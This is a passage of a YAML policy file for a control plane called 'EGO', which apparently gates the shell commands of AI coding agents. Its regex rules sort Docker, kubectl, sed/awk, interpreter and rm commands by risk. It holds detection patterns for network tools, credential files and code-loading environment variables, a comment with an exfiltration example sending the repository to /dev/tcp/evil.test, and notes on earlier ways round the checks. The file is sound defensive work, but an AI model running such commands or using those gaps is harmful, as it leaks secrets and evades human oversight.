    # container a host device and `--security-opt seccomp=unconfined` / `apparmor=unconfined` remove the syscall
    # filter; the residuals document claimed these gated before they did (decision challenge, finding 9).
    command: '^(docker|podman|nerdctl)\b[^|;&]*\s(--privileged|--pid[= ]host|--net(work)?[= ]host|--userns[= ]host|--ipc[= ]host|--uts[= ]host|--cgroupns[= ]host|--device[= ]|--device-cgroup-rule|--security-opt[= ]?\S*(unconfined|seccomp=unconfined|apparmor=unconfined|no-new-privileges=false)|--cap-add[= ]?(CAP_)?(ALL|SYS_ADMIN|SYS_PTRACE|SYS_MODULE|DAC_READ_SEARCH|SYS_CHROOT|SYS_BOOT|SYS_RAWIO|MKNOD|NET_ADMIN|NET_RAW|SETUID|SETGID|AUDIT_CONTROL|BPF|PERFMON)|--pid[= ]container|--userns[= ]keep-id)'
  # `docker|podman exec` enters an ALREADY-RUNNING container whose isolation EGO never established, and runs an
  # unclassified command there. `run` is judged by its own flags and bind mounts above and below, so it is not
  # gated wholesale: that would make ordinary local development ask on every invocation. The unverified isolation
  # of the container runtime itself is a containment requirement (#26), not a per-invocation prompt.
  - capability: command.script-opaque
    tool: Bash
    command: '^(docker|docker-compose|podman|podman-compose|nerdctl|lima|colima)(\s+(compose|container|service|stack))?\s+(exec|attach)\b'
  # A PUSH IS A PUSH IN EVERY SPELLING. The management-group form (`docker image push`), the compose form
  # (`docker compose push`) and buildx's `--push` were not all covered, so the same upload to a shared registry
  # was DENY as `docker push` and ALLOW as `docker image push` (exit review 7).
  # `--mount type=bind,source=/…` is the long spelling of `-v /…:/…`, and a `local` volume whose `device=` names
  # a host path is a bind mount by another name: both hand the host filesystem to the container (exit review 8).
  - capability: command.privileged
    tool: Bash
    command: '^(docker|podman|nerdctl)\b[^|;&]*--mount[= ][^\s]*(type=bind[^\s]*,\s*source=(/|~|\$HOME)|volume-opt=device=(/|~|\$HOME))'
  # helm PLUGINS are arbitrary programs installed into helm and run by it.
  - capability: command.network-tool
    tool: Bash
    command: '^helm\b[^|;&]*\splugin\s+(install|update)\b'
  - capability: command.script-opaque
    tool: Bash
    command: '^helm\b[^|;&]*\splugin\s+(uninstall|remove|run)\b'
  # kustomize's exec plugins and KRM functions run arbitrary programs and images against the rendered manifests.
  - capability: command.script-opaque
    tool: Bash
    command: '^(kustomize|kubectl\s+kustomize)\b[^|;&]*(--enable-exec|--enable-alpha-plugins|--helm-command(=|\s)|\sfn\s+run\b)'
  - capability: container.registry.push
    tool: Bash
    command: '^(docker|podman|nerdctl)\s+((image|manifest|compose|buildx)\s+)?(push\b|build\b[^|;&]*--push)'
  # Handing a registry password on the command line writes it into the shell history and the process table.
  # SCOPED TO THE VERBS THAT TAKE ONE: docker's `-p` is `--publish`, so an unscoped rule turned `docker run -p
  # 8080:80 nginx` — the most ordinary container command there is — into a credential exposure (exit review 8).
  - capability: command.credential-exposure
    tool: Bash
    command: '^(docker|podman|nerdctl|helm|npm|gh|glab)\s+(registry\s+)?(login|publish|push|adduser)\b[^|;&]*\s(-p|--password)(=|\s)(?!-)'
  # FORWARDING A CREDENTIAL INTO A CONTAINER IS AN ACT OF ITS OWN. `docker run -e AWS_SECRET_ACCESS_KEY <image>`
  # hands the host's production credentials to a program EGO never read, and the official CLI images turn that
  # into the CLI itself: `docker run -e AWS_… amazon/aws-cli iam delete-user` performed an absolute core deny
  # unattended, because no cloud capability was ever hit (exit review 7). The container is not re-targeted here —
  # the credential is what makes this reviewable, whatever the image then does with it.
  - capability: command.credential-exposure
    tool: Bash
    command: '^(docker|podman|nerdctl)\s+(container\s+)?(run|create|exec)\b[^|;&]*\s(-e|--env)(=|\s*)"?''?(AWS_|GOOGLE_|GCP_|AZURE_|ARM_|VAULT_|GITHUB_TOKEN|GH_TOKEN|GITLAB_TOKEN|NPM_TOKEN|DOCKER_PASSWORD|KUBECONFIG|PG|MYSQL_PWD|OPENAI_|ANTHROPIC_)'
  # `kubectl config view --raw` PRINTS THE KUBECONFIG UNREDACTED — client certificates, bearer tokens and the
  # credentials of every cluster the developer can reach, production included. Without `--raw` the values are
  # redacted, so the flag is the whole difference (exit review 7).
  - capability: fs.credential-store.read
    tool: Bash
    command: '^(kubectl|oc)\s+config\s+view\b[^|;&]*--raw\b'
  # awk RUNS A SHELL. `print … | "cmd"`, `"cmd" | getline` and `system("cmd")` all fork /bin/sh, and the command
  # is an arbitrary string EXPRESSION, so holding it in a variable is the same act (exit review 7).
  - capability: command.script-opaque
    tool: Bash
    command: '^(awk|gawk|mawk|nawk|busybox\s+awk)\b[\s\S]*(\bsystem\s*\(|\bprint[^|]*\||\|\s*getline|@(include|load)\b)'
  # Joining a SWARM binds this engine to a remote manager, which then schedules work on it: the same kind of
  # name-to-engine binding as `context create` (exit review 7).
  - capability: container.nonlocal.run
    tool: Bash
    command: '^(docker|podman|nerdctl)\s+swarm\s+(join|join-token|init\b[^|;&]*--advertise-addr)'
  # destroying a local volume, network or builder cache is destructive local work, which the human approves
  - capability: container.prune
    tool: Bash
    command: '^(docker|podman|nerdctl)\s+(volume|network|secret|config|builder|buildx|system|image|container)\s+(rm|remove|prune)\b'
  - capability: container.prune
    tool: Bash
    command: '^(docker|podman)\s+(system\s+prune|image\s+prune|volume\s+prune|container\s+prune)\b'
  # `--insecure-skip-tls-verify` turns off the check that the cluster is the one it claims to be.
  - capability: k8s.target.unclassified
    tool: Bash
    command: '^(kubectl|oc|helm)\b[^|;&]*--insecure-skip-tls-verify\b'
  # `docker trust sign` publishes a signature that makes an image trusted for everyone who pulls it.
  - capability: container.registry.push
    tool: Bash
    command: '^(docker|podman|nerdctl)\s+trust\s+(sign|key\s+generate|signer\s+add|revoke)\b'
  # `docker compose run --build` builds before it runs, so the Dockerfile the compose file names executes.
  - capability: command.script-opaque
    tool: Bash
    command: '^((docker|podman|nerdctl)\s+compose|docker-compose|podman-compose)\b[^|;&]*\srun\b[^|;&]*--build\b'
  # `docker compose build` builds whatever the compose FILE names, which EGO does not parse: the Dockerfile it
  # chooses, its context and its build args are all decided by a file this kernel never read.
  - capability: command.script-opaque
    tool: Bash
    # the COMPOSE form only: `(compose\s+)?` was optional, so this swallowed every plain `docker build` and made
    # an ordinary image build opaque — the proportionality half of the same rule
    command: '^((docker|podman|nerdctl)\s+compose|docker-compose|podman-compose)\b[^|;&]*\s(build\b|up\b[^|;&]*--build\b)'
  # `docker stack deploy` ships a compose file to a SWARM — a cluster, not this machine — and the file names
  # the images, the mounts and the secrets, none of which this kernel read (exit review 8).
  - capability: container.nonlocal.run
    tool: Bash
    command: '^(docker|podman|nerdctl)\s+stack\s+(deploy|up)\b'
  - capability: container.build
    tool: Bash
    command: '^(docker|podman)\s+(build|buildx)\b'
  - capability: container.inspect
    tool: Bash
    command: '^(docker|podman)\s+(ps|images|inspect|logs|top|stats|version|info|image\s+ls)\b'
  # a bind mount hands the container the host path: mounting home, the filesystem root or a credential directory
  # reads it just as surely as `cat` would (round 14)
  - capability: fs.credential-store.read
    tool: Bash
    command: '^(docker|podman|nerdctl)\s+\S+\b[^|;&]*\s(-v|--volume|--mount)(=|\s)\S*((~|\$HOME|\$\{HOME\})(/[^:\s]*)?:|/:|[^:\s]*\.(ssh|aws|kube|gnupg|docker|npmrc|pypirc)[^:\s]*:)'
  # `nerdctl` is containerd's docker-compatible client: the same flags, the same `--context`, the same effects.
  # It is enrolled in the target RESOLVER and was missing here, so nothing classified it and its target was never
  # resolved — found by the property that pins these two lists together (exit review 7).
  - capability: container.run
    tool: Bash
    command: '^(docker|podman|nerdctl|lima|colima)(-compose)?\b'
  - capability: k8s.local.delete
    tool: Bash
    command: '^(kind\s+delete|k3d\s+cluster\s+delete|minikube\s+delete|kubectl\b[^|;&]*\sdelete\s+(ns|namespace))\b'
  # `kubectl config set-credentials … --exec-command=PROG` installs a program kubectl RUNS to mint a token, and
  # `set-cluster`/`set-context`/`use-context` re-point every later command. These write the ambient kubeconfig
  # without ever naming its path, so the `.kube/**` write rules never saw them (exit review 4).
  - capability: fs.credential-store.write
    tool: Bash
    command: '^kubectl\s+config\s+(set-credentials|set-cluster|set-context|rename-context|delete-context|delete-cluster|delete-user|unset|set)\b'
  # `oc` is the OpenShift client: the same API, the same verbs, the same `--context`. It appears in the
  # production-marker rule above and in the kubeconfig rule, but NOT here — the rule that gives a cluster command
  # a capability at all. Without one, `retargetLocalCapability` has nothing to re-target and
  # `oc --context acme-eu-1 delete project payments` fell through to command.unknown (exit review 7).
  - capability: k8s.local.apply
    tool: Bash
    command: '^(kubectl|oc|helm|kind|k3d|minikube|kustomize)\b'
  # --- command classes ---
  - capability: command.privileged
    tool: Bash
    command: '^(sudo|doas|su)\b'
  # `pnpm dlx` / `yarn dlx` fetch a package from the registry and run it: a network transfer whose payload EGO
  # never reads. The marker is emitted by the normalizer, which also hands the inner command to the analyzer, so
  # a denied effect inside a dlx invocation is still denied on its own (exit review 4).
  - capability: command.network-tool
    tool: Bash
    command: '^\x00ego\x00registry-fetch\s+(pnpm|yarn)\s+dlx\b'
  # A version or help query touches no network at all, and the tools themselves say so. It sits BEFORE the network
  # rule because matching is first-match-wins per segment (exit review 5).
  - capability: command.read-only
    tool: Bash
    command: '^(curl|wget|scp|sftp|rsync|ssh|nc|ncat|telnet|git-lfs)\s+(--version|--help|-V|-h)\s*$'
  # A Dockerfile's `SHELL` directive re-points every later `RUN` at that program, so the recipe text EGO read is
  # not what determines the effect — the same statement as a makefile's `SHELL :=` (exit review 8).
  - capability: command.script-opaque
    tool: Bash
    command: '^\x00ego\x00dockerfile-shell\s+'
  # A BASH NETWORK REDIRECTION IS EGRESS WITH NO NETWORK BINARY. `> /dev/tcp/HOST/PORT` is not a file: bash
  # intercepts the pathname and calls connect(2), so `tar czf - . > /dev/tcp/evil.test/443` ships the whole
  # repository — `.git` and `.env` included — and the analyzer had been discarding the target as a device sink
  # (exit review 7). The marker is emitted by the normalizer and carries the protocol, host and port.
  - capability: command.network-tool
    tool: Bash
    command: '^\x00ego\x00net-redirect\s+'
  - capability: command.network-tool
    tool: Bash
    command: '^(curl|wget|scp|sftp|rsync\b.*:|ssh|nc|ncat|telnet)\b'
  # A RECURSIVE DELETE OF A DERIVED DIRECTORY DESTROYS NOTHING THAT CANNOT BE REGENERATED. `rm -rf node_modules`
  # is the single most routine recovery command in JavaScript development, and `dist`, `target`, `__pycache__`
  # and their siblings are build output by convention in their ecosystems — an install or a build puts every one
  # of them back. Gating them made the control plane interrupt the ordinary inner loop, which is how a control
  # plane gets switched off (exit review 7). The list is AUTHORED here rather than compiled into the kernel, so
  # an organization can shorten it; every other recursive deletion keeps `command.destructive`, and a path that
  # leaves the workspace or reaches a protected tree is still judged on the path and still denied.
  - capability: fs.repo.delete
    tool: Bash
    # ON CASE: every matcher here is compiled case-INSENSITIVELY, so `rm -rf DIST` matches `dist`. On macOS and
    # Windows that IS the same directory and the match is exactly right; on a case-sensitive filesystem it also
    # allows a directory named `DIST`, which the rule did not mean to name. That residue is accepted, and it is
    # bounded by construction: the operand is a RELATIVE name with no `..`, so whatever its case it is inside the
    # checkout and recoverable from version control, and a path that leaves the workspace or reaches a protected
    # tree is judged on the path and still denied. Case sensitivity cannot be expressed in a case-insensitive
    # regex, so the honest choice is the simple rule plus this note rather than a lookahead that silently means
    # something else.
    command: '^rm\s+(-[a-zA-Z]+\s+)*((\./)?(node_modules|bower_components|dist|build|out|target|coverage|htmlcov|__pycache__|\.pytest_cache|\.mypy_cache|\.ruff_cache|\.tox|\.next|\.nuxt|\.turbo|\.parcel-cache|\.svelte-kit|\.angular|\.gradle|\.venv|venv|vendor|\.terraform|Pods|DerivedData)/?\s*)+$'
  # An option whose value NAMES A PROGRAM the compiler or runtime will run: rustc's linker, javac's `-J` JVM
  # options (which carry `-javaagent:`), and the in-place formatters that rewrite the file they are given.
  - capability: command.script-opaque
    tool: Bash
    command: '^(rustc|cargo|clang|gcc|g\+\+|ld)\b[^|;&]*\s-C\s*(linker|link-arg|link-args|linker-plugin)='
  - capability: command.script-opaque
    tool: Bash
    command: '^(javac|java|kotlinc|scalac|gradle|mvn)\b[^|;&]*\s-J?-?(javaagent|agentlib|agentpath|Xbootclasspath)'
  # `shfmt -w`, `prettier --write`, `black`, `gofmt -w`: an in-place rewrite of the file named, which the path
  # rules then judge — a hook or a policy file is not an ordinary destination (exit review 8).
  - capability: command.local-mutation
    tool: Bash
    command: '^(shfmt|gofmt|rustfmt|clang-format|black|isort|yapf|buf\s+format)\b[^|;&]*\s(-w|--write|-i|--in-place)(\s|$)'
  # `tar --remove-files` DELETES every file once it is archived, and `docker trust sign` publishes a signature
  # that makes an image trusted for everyone who pulls it.
  - capability: command.destructive
    tool: Bash
    command: '^g?tar\b[^|;&]*--remove-files\b'
  # `lint-staged --config F` takes its command list from a file this kernel never read.
  - capability: command.unmodelled-closure
    tool: Bash
    command: '^(npx\s+)?lint-staged\b[^|;&]*\s(-c|--config)(=|\s)'
  # `tar cf host:/path` uses tar's REMOTE archive syntax: the archive is written on another machine over rsh/ssh,
  # which is egress with no network binary on the line (exit review 8).
  - capability: command.network-tool
    tool: Bash
    command: '^g?tar\b[^|;&]*\s(-f(=|\s*)|[a-zA-Z]*f\s+)[A-Za-z0-9_.-]+:[^\s]'
  # `zip -m` / `--move` DELETES every file it archived once the archive is written.
  - capability: command.destructive
    tool: Bash
    command: '^zip\b[^|;&]*\s(-[a-zA-Z]*m[a-zA-Z]*|--move)(\s|$)'
  - capability: command.destructive
    tool: Bash
    command: '^rm\s+-[a-zA-Z]*r'
  # Deleting ONE named file, or renaming one, is ordinary work inside a checkout — `fs.repo.delete` and
  # `fs.repo.rename` are ALLOW capabilities that nothing routed to, so every `rm src/a.ts` asked while `mv`
  # did not (decision challenge, finding 16). Recursive deletion keeps its own destructive class above, and the
  # path operands are still classified, so `rm ~/.ssh/id_rsa` is judged on the path, not on the verb.
  - capability: fs.repo.delete
    tool: Bash
    command: '^(rm|unlink)\s+(-[fiv]+\s+)*[^-]'
  - capability: fs.repo.rename
    tool: Bash
    command: '^mv\s+(-[fivn]+\s+)*[^-]'
  # An option whose VALUE IS A PROGRAM the tool will run: go's analysis tool, cargo's compiler wrapper, and the
  # in-place editors whose `-e` program is a script (exit review 8).
  - capability: command.script-opaque
    tool: Bash
    command: '^(go|gofmt|cargo|rustc|dotnet|mvn|gradle)\b[\s\S]*(-vettool|-toolexec|--vettool|rustc-wrapper|rustc_wrapper|target\.[^\s=]*\.runner|--exec|--plugin)(=|\s)'
  # `perl -i -e`, `ruby -i -pe`, `gawk -i inplace`: an in-place edit whose program is inline code. The program is
  # executed and the FILE is rewritten, so both halves matter.
  - capability: command.interpreter-inline
    tool: Bash
    command: '^(perl|ruby|python3?)\b[^|;&]*\s-[a-zA-Z]*i[a-zA-Z]*(\s|\.)[^|;&]*\s-[a-zA-Z]*e'
  - capability: command.interpreter-inline
    tool: Bash
    command: '^(gawk|awk)\b[^|;&]*\s-i\s+inplace\b'
  - capability: command.test
    tool: Bash
    command: '^(npm\s+(test|run\s+test\S*)|(npx\s+)?(vitest|jest|mocha|playwright|ava|tap|karma)|pnpm\s+test|yarn\s+test|pytest|go\s+test|cargo\s+test|node\s+--test(?!-)|python3?\s+-m\s+(pytest|unittest))\b'
  - capability: command.build
    tool: Bash
    command: '^(npm\s+run\s+(build|typecheck|lint|format|check)|(npx\s+)?(tsc|esbuild|eslint|prettier|biome|oxlint|dprint|lint-staged|vite|rollup|webpack|swc|turbo|nx|next|ng|tsup|parcel)\b|pnpm\s+(build|lint)|yarn\s+(build|lint)|go\s+(build|vet)|cargo\s+(build|check|clippy)|make\b)'
  # `kotlinc -script FILE` (and `scala FILE`, `jshell FILE`) RUNS the file rather than compiling it, so it is an
  # interpreter invocation wearing a compiler's name (exit review 7).
  - capability: command.interpreter-script
    tool: Bash
    command: '^(kotlinc?|scala|scalac|jshell|groovy|jbang)\b[^|;&]*(\s-script\b|\s\S+\.(kts|sc|groovy|jsh)(\s|$))'
  # Compilers and version probes whose semantics are fixed: they read source and write objects, and nothing else.
  # Whole ecosystems had no matcher at all, so ordinary `javac`, `php -v` or `git lfs ls-files` reached
  # command.unknown and asked (challenge 6, finding 36; challenge 8, finding 28). Deliberately EXCLUDES the project
  # task runners — mvn, gradle, bazel, sbt, dotnet build, rake, bundle exec, composer — which execute
  # repository-defined tasks and are producers EGO does not model.
  # A VERSION PROBE IS NOT A TASK. `yarn|pnpm|bun|deno|npx|rake|sbt|bazel <version>` and `pip list|show|freeze`
  # reached command.unknown while `npm --version` was ALLOW, which is an omission in this list rather than a
  # judgement about those tools (corpus by semantic class, 2026-09-24). The form stays anchored with `\s*$`, so
  # only the probe itself is named; the task-running forms of the same heads are untouched. Where such a head is
  # ALSO an unmodelled producer — `mvn -v`, `gradle --version` — the opacity of the head still gates the
  # invocation, and that fail-safe is deliberate: see docs/architecture/phase-1-residuals.md.
  - capability: command.build
    tool: Bash
    # `\b` cannot follow `+`: it is not a word character, so `g++ -c a.cpp` never matched and the most ordinary
    # C++ compile gated (exit review 2). A lookahead for whitespace-or-end works for every name in the list.
    command: '^(javac|kotlinc|scalac|swiftc|gcc|g\+\+|c\+\+|clang|clang\+\+|cc|ld|ar|nm|objdump|strip|rustc|tsc)(?=\s|$)|^swift\s+build\b|^dart\s+compile\b|^python3?\s+-m\s+venv\b'
  - capability: command.read-only
    tool: Bash
    command: '^(php|java|ruby|perl|python3?|node|go|cargo|rustc|javac|swift|dart|dotnet|mvn|gradle|pip3?|poetry|uv|bundle|gem|composer|brew|docker|kubectl|helm|terraform|aws|gcloud|az|make|cmake|git-lfs|yarn|pnpm|bun|deno|npx|rake|sbt|bazel)\s+(-v|-V|--version|-version|version)\s*$|^git\s+lfs\s+(ls-files|status|env|version|locks)\b|^(cmake|ninja)\s+(--version|-t\s+\w+|--help)\b|^pip3?\s+(list|show|freeze)\b'
  # Formatters, linters and type checkers with FIXED semantics: they read the workspace and rewrite source
  # files in it, and nothing else. Whole ecosystems had no path to ALLOW for ordinary `gofmt`/`ruff`/`black`/
  # `cargo fmt`, so a control plane that governs them all equally was unusable outside JavaScript (challenge 6,
  # findings 14, 15). Deliberately EXCLUDES the project task runners — mvn, gradle, rake, bundle exec, dotnet,
  # composer, tox — because those execute repository-defined tasks and are producers EGO does not yet model:
  # calling them ALLOW would be exactly the unearned positive claim this phase exists to remove.
  - capability: command.build
    tool: Bash
    command: '^(gofmt|goimports|golangci-lint|staticcheck|rustfmt|clang-format|shfmt|shellcheck|stylua|ktlint|google-java-format|php-cs-fixer|yamllint|markdownlint|hadolint|ruff|black|isort|flake8|mypy|pylint|rubocop|standardrb)\b|^cargo\s+fmt\b|^go\s+fmt\b|^terraform\s+(fmt|validate)\b|^python3?\s+-m\s+(black|ruff|isort|flake8|mypy|pylint)\b'
  # inline interpreters are opaque, so a body that NAMES a protected store fails closed to the same deny the literal verb receives.
  # Round 13: this block sits BEFORE command.read-only. Its `console.log(…)` / `print(…)` carve-out used to win
  # first-match and turn a credential read or a hook write into a silent ALLOW.
  - capability: fs.credential-store.write
    tool: Bash
    command: '(^|\s)(node|nodejs|deno|bun|tsx|ts-node|python|python2|python3|ruby|perl|php|Rscript|osascript)\b[^;|&]*?\s(-e|-c|-r|-E|-p|--eval|--exec|--command)\b[\s\S]*(\.ssh/|\.aws/credentials|\.aws/config|\.gnupg|\.netrc|\.npmrc|\.pypirc|\.kube/|\.git-credentials|\.docker/config|id_rsa|id_ed25519|id_ecdsa|id_dsa)'
  - capability: ego.trust.tamper
    tool: Bash
    command: '(^|\s)(node|nodejs|deno|bun|tsx|ts-node|python|python2|python3|ruby|perl|php|Rscript|osascript)\b[^;|&]*?\s(-e|-c|-r|-E|-p|--eval|--exec|--command)\b[\s\S]*\.ego/(trust|runtimes|releases|index)\b'
  - capability: fs.hook-config.write
    tool: Bash
    command: '(^|\s)(node|nodejs|deno|bun|tsx|ts-node|python|python2|python3|ruby|perl|php|Rscript|osascript)\b[^;|&]*?\s(-e|-c|-r|-E|-p|--eval|--exec|--command)\b[\s\S]*(\.git/hooks|\.husky/|\.githooks/|\.harness/hooks|core\.hooksPath|\.claude/settings|\.codex/)'
  - capability: ego.runtime.tamper
    tool: Bash
    command: '(^|\s)(node|nodejs|deno|bun|tsx|ts-node|python|python2|python3|ruby|perl|php|Rscript|osascript)\b[^;|&]*?\s(-e|-c|-r|-E|-p|--eval|--exec|--command)\b[\s\S]*\.harness/(generated|runtime)\b'
  - capability: fs.git-internals.write
    tool: Bash
    command: '(^|\s)(node|nodejs|deno|bun|tsx|ts-node|python|python2|python3|ruby|perl|php|Rscript|osascript)\b[^;|&]*?\s(-e|-c|-r|-E|-p|--eval|--exec|--command)\b[\s\S]*\.git/(refs|objects|config|HEAD|packed-refs|info|logs)'
  # An inline body that spawns a process, escapes to a shell or touches the filesystem is never read-only, whatever
  # it is wrapped in. Round 13: `node -e 'console.log(execSync("git push origin main"))'` reached ALLOW.
  - capability: command.interpreter-inline
    tool: Bash
    command: '(^|\s)(node|nodejs|deno|bun|tsx|ts-node|python|python2|python3|ruby|perl|php|Rscript|osascript)\b[^;|&]*?\s(-e|-c|-r|-E|-p|--eval|--exec|--command)\b[\s\S]*(child_process|execSync|execFileSync|spawnSync|execFile|spawn\s*\(|os\.system|os\.popen|subprocess|popen|IO\.popen|shell_exec|proc_open|passthru|system\s*\(|require\s*\(|import\s|__import__|fs\.|writeFile|appendFile|unlink|rmSync|rmdir|readFile|open\s*\(|eval\s*\(|Function\s*\(|process\.|Deno\.|Bun\.)'
  # awk and sed are read-only only while their program neither escapes to a shell nor writes a file
  - capability: command.interpreter-inline
    tool: Bash
    # a pipe on EITHER side of a quoted string inside an awk program is a shell command (`"cmd" | getline`,
    # `print | "cmd"`); sed's `e` command and the s///e flag execute their result; `w` writes a file
    command: '^(awk|gawk|mawk|nawk|sed)\b[\s\S]*(system\s*\(|\|\s*["'']|["'']\s*\|&?|\|\s*&?\s*getline|ENVIRON|close\s*\(|print[fl]?[^|>]*>|\bw\s+/|--in-place|(^|[;{''"\s])[0-9$,~+]*\s*e[\s;}]|s(.)(?:(?!\3).)*\3(?:(?!\3).)*\3[a-z]*e)'
  # sed's `e` FLAG on a substitution executes the result, with ANY delimiter (`s|x|id|e`, `s#x#id#e`).
  # A dedicated matcher keeps the backreference unambiguous.
  - capability: command.interpreter-inline
    tool: Bash
    command: '^(?:sed|gsed)\b[\s\S]*\ss(.)(?:(?!\1)[\s\S])*\1(?:(?!\1)[\s\S])*\1[a-z]*e'
  # a program supplied by FILE is opaque: it is judged like any other script, not as a read-only one-liner
  # sed's `e` COMMAND — `1e CMD`, `$e CMD`, `/re/e CMD` — executes CMD for the matching lines; the existing rule
  # covered only the `s///e` FLAG. gawk's `-i`/`-l` load a library and `-E` takes its program from a file, and
  # each of those is a program EGO never read (exit review 8).
  - capability: command.interpreter-inline
    tool: Bash
    command: '^(sed|gsed)\b[\s\S]*(^|[;{''"\s])[0-9$,~+/^]*\s*e\s+\S'
  - capability: command.interpreter-script
    tool: Bash
    command: '^(awk|gawk|mawk|nawk|sed|gsed)\b[^|;&]*\s(-f|--file|--source)(=|\s)'
  # gawk's library flags load a program file. `-E` is deliberately absent: every matcher here is compiled
  # case-insensitively, so it cannot be told apart from `-e`, and `sed -e s/a/b/ f` is the most ordinary
  # invocation there is. The long spelling `--exec` says the same thing and can be matched.
  - capability: command.interpreter-script
    tool: Bash
    command: '^(gawk|awk|mawk|nawk)\b[^|;&]*\s(-i|--include|-l|--load|--exec|--source)(=|\s)'
  # gawk's `-E FILE`, surfaced by the normalizer because a case-insensitive matcher cannot tell it from `-e`.
  - capability: command.interpreter-script
    tool: Bash
    command: '^\x00ego\x00awk-program-file\b'
  # read-only search tools that can hand a file to an arbitrary program
  - capability: command.interpreter-script
    tool: Bash
    command: '^(rg|ripgrep|grep|ag)\b[^|;&]*\s(--pre|--hostname-bin|--pre-glob)(=|\s)'
  # …EXCEPT when the name IS execution. A standalone `export PATH=/tmp/evil` or `BASH_ENV=/tmp/x` redefines what
  # every later command in that shell runs, and the `export` form reached the bounded builtin rather than the
  # binding. Anchored to an assignment-ONLY line, so it can never shadow a command that follows one: those are
  # stripped by the normalizer into an `env-inject` marker long before this.
  # The two sets are exactly the ones the `env-inject` marker rules above distinguish, so a standalone binding and
  # a binding in front of a command get the SAME verdict rather than two different ones.
  # A SEARCH PATTERN IS DATA. These two rules match a binding ANYWHERE on the line, which is right for a command
  # they precede and wrong for a word a search tool was asked to look for: `grep -rn 'NODE_OPTIONS=' .` — reading
  # your own repository for the name of a variable — was refused outright (exit review 7). The head is excluded,
  # not the word, because the analyzer cannot tell a pattern from a binding once the quoting is gone, and the
  # tools that take a pattern are exactly the ones where the distinction matters.
  # `NODE_OPTIONS` is narrowed to the options that LOAD CODE: `--max-old-space-size=4096` raises the V8 heap and
  # executes nothing, and denying it gated the standard fix for an out-of-memory build.
  - capability: command.env-inject
    tool: Bash
    command: '^(?!(?:grep|rg|ripgrep|egrep|fgrep|ag|ack|sed|gsed|awk|gawk|find|fd|xargs|comm|diff)\b)[\s\S]*(?:^|\s)(?:LD_PRELOAD|LD_LIBRARY_PATH|DYLD_[A-Z_]*|BASH_ENV|ENV|PS4|BASH_XTRACEFD|PROMPT_COMMAND|PYTHONSTARTUP|PYTHONPATH|PERL5OPT|RUBYOPT|GIT_[A-Z_]*|EGO_[A-Z_]*|CLAUDE_[A-Z_]*|CODEX_[A-Z_]*|SSH_ASKPASS|SUDO_ASKPASS|IFS|SHELL)\+?='
  - capability: command.env-inject
    tool: Bash
    command: '^(?!(?:grep|rg|ripgrep|egrep|fgrep|ag|ack|sed|gsed|awk|gawk|find|fd|xargs|comm|diff)\b)[\s\S]*(?:^|\s)NODE_OPTIONS\+?=\S*(--(require|import|loader|experimental-loader|env-file|conditions)\b|(^|\s)-r\b)'
  - capability: command.env-override
    tool: Bash
    command: '^(?!(?:grep|rg|ripgrep|egrep|fgrep|ag|ack|sed|gsed|awk|gawk|find|fd|xargs|comm|diff)\b)[\s\S]*(?:^|\s)(?:KUBECONFIG|AWS_PROFILE|AWS_CONFIG_FILE|AWS_SHARED_CREDENTIALS_FILE|DOCKER_HOST|DOCKER_CONFIG|NPM_CONFIG_[A-Z_]*|HOME|PATH)\+?='
  # `git grep -O<cmd>` / `--open-files-in-pager=<cmd>` hands <cmd> to git's pager machinery, which runs it
  # through a shell with the matching file names appended — a program EGO never read (exit review 8).
  - capability: command.script-opaque
    tool: Bash
    command: '^git\b[\s\S]*\s(-O|--open-files-in-pager)(=|\s*)\S'
  # ORDINARY READ-ONLY GIT PLUMBING AND EVERYDAY VERBS. These fell through every matcher to command.unknown and
  # asked: a search of tracked files, a read of an object, a read of configuration, and deleting one tracked file
  # — which `rm src/a.ts` already does without asking (exit review 7). `git config` WITHOUT a value is a read;
  # the program-valued write forms are matched far above this and win first.
  - capability: command.read-only
    tool: Bash
    command: '^git\s+(grep|cat-file|ls-tree|ls-files|rev-list|show-ref|show-branch|shortlog|describe|merge-base|name-rev|var|count-objects|verify-pack|diff-tree|diff-index|for-each-ref|check-ignore|check-attr)\b'
  - capability: command.read-only
    tool: Bash
    # A SCOPE IS NOT A READ. `--local` says WHERE, not WHAT: `git config --local alias.y '!git push …'` sets a
    # shell alias and must never be ALLOW, so the read forms are named explicitly and a bare key is a read only
    # when nothing follows it.
    command: '^git\s+config\s+(--(global|local|system|worktree|file\s+\S+)\s+)?(--(get|get-all|get-regexp|get-urlmatch|list|name-only|show-origin|show-scope|null|type)\b|-l\s*$|[A-Za-z0-9._-]+\s*$)'
  - capability: fs.repo.delete
    tool: Bash
    command: '^git\s+rm\b'
  # `flock FILE -c CMD` takes a lock and runs CMD — the standard idiom for serializing a build. The normalizer
  # hands CMD to the analyzer on its own, so what is left here is the CARRIER, which opens one file and executes
  # nothing else; with no matcher for it the whole line reached command.unknown (exit review 7).
  - capability: command.read-only
    tool: Bash
    command: '^flock\b'
  # `[[ … ]]` and `[ … ]` are the shell's own test constructs: a conditional expression opens no file and runs no
  # program, and `[[ -n $CI ]] && npm test` — the standard guard in a CI script — asked (exit review 7).
  - capability: command.read-only
    tool: Bash
    command: '^\[\[?\s'
  # An IN-PLACE edit is an ordinary write, and the path rules judge the file it names — but only for `sed`,
  # whose program is a substitution script. `perl -i -e '…'` and `ruby -i -pe '…'` carry INLINE CODE, and this
  # rule sat above the interpreter rules, so it turned `perl -i -e 'exec "git push origin main"'` into an
  # ordinary local write (exit review 8, in a rule added one pass earlier to fix proportionality).
  - capability: command.local-mutation
    tool: Bash
    command: '^(sed|gsed)\s+(-[a-zA-Z]*i|--in-place)(\S*)?\s'
  # `kustomize build` RENDERS to stdout: it reads kustomization.yaml and contacts no cluster at all.
  - capability: command.read-only
    tool: Bash
    command: '^kustomize\s+(build|cfg|fn|version|edit\s+(list|set\s+image))\b'
  # Pure shell structure and no-op builtins. They were never classified, so they were command.unknown (ASK) at top
  # level; once a script body stopped being pre-filtered, every `set -e` and `done` line asked. A redirection or a
  # command substitution disqualifies the line — `: > ~/.ssh/known_hosts` and `trap "curl …"` must NOT land here.
  # Matching is FIRST-MATCH-WINS per segment, so a line that lands here is not seen by the write-destination
  # matchers, which is why the guard is load-bearing rather than decorative. Three redirections are exempt because
  # they can reach nothing governed: a discard to /dev/null, a file-descriptor duplication, and an input read from
  # a workspace-relative path with no `..` — `popd >/dev/null` and `while read -r l; do …; done < list.txt` are how
  # ordinary scripts are written, and both asked (exit review 4).
  - capability: command.read-only
    tool: Bash
